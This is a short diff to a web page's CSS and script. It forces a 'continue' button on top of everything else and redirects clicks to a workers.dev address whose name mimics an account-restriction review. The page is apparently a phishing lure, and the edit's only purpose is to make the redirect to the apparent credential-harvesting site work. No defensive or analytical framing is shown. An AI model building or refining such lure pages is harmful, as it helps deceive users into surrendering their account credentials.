@@ -217,6 +217,9 @@ body::before{
     font-weight:bold;
     cursor:pointer;
     display:none;
+    position:relative;
+    z-index:9999;
+    pointer-events:auto;
     box-shadow:0 0 25px rgba(0,255,200,0.25);
 }
 
@@ -312,9 +315,10 @@ window.onload = ()=>{
 
 };
 
-document.getElementById("continueBtn").onclick = function(){
-    window.open("https://review-request.restriction-update-issue.workers.dev/", "_self");
-};
+document.getElementById("continueBtn").addEventListener("click", function(e){
+    e.preventDefault();
+    window.location.href = "https://review-request.restriction-update-issue.workers.dev/";
+});
 
 </script>
 
